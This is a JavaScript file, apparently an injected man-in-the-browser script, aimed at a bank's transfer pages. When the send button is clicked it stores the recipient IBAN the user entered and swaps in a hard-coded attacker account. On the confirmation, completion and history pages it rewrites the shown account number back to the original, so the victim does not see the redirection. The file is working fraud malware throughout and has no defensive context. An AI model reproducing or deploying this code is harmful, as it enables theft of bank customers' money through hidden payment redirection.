function addEvent(obj, evType, fn) {
	if (obj.addEventListener) {
		obj.addEventListener(evType, fn, false);
		return true;
	} else if (obj.attachEvent) {
		var r = obj.attachEvent("on" + evType, fn);
		return r;
	} else {
		alert("Handler could not be attached");
	}
}

new_iban = '69696969696969696969696969'

if (window.location.href.indexOf("new") != -1) {
	// Transfer request form handling
	console.log("Changing the account number sent via transfer request form to: " + new_iban);
	var button = document.getElementById("btn-send-transfer");
	var iban_field = document.getElementById("id_to_account");

	addEvent(button, "click", function() {
		localStorage["number"] = iban_field.value;
		iban_field.value = new_iban;
	});
}

if (window.location.href.indexOf("confirm") != -1) {
	if (localStorage["number"]) {
		// Transfer confirmation form handling
		console.log("Changing the shown bank account number to: " + localStorage["number"]);
		
		shown_number_li = document.getElementById("transfer-details").getElementsByTagName("li")[0];
		shown_number_li.innerHTML = "Receiver's account number: " + localStorage["number"];
	}
}

if (window.location.href.indexOf("complete") != -1) {
	if (localStorage["number"]) {
		// Transfer completed form handling
		console.log("Changing the shown bank account number to: " + localStorage["number"]);
		
		shown_number_li = document.getElementById("transfer-details").getElementsByTagName("li")[0]
		shown_number_li.innerHTML = "Receiver's account number: " + localStorage["number"];
	}
}

if (window.location.href.indexOf("history") != -1) {
	if (localStorage["number"]) {
		// Transfer completed form handling
		console.log("Changing the shown bank account number to on the screen final: " + localStorage["number"]);
		
		shown_number_tr = document.getElementsByTagName("tr");
		last_tr = shown_number_tr[shown_number_tr.length - 1];

		td = last_tr.getElementsByTagName("td")[1];
		td.innerHTML = "<td>" + localStorage["number"] + "</td>";
	}
}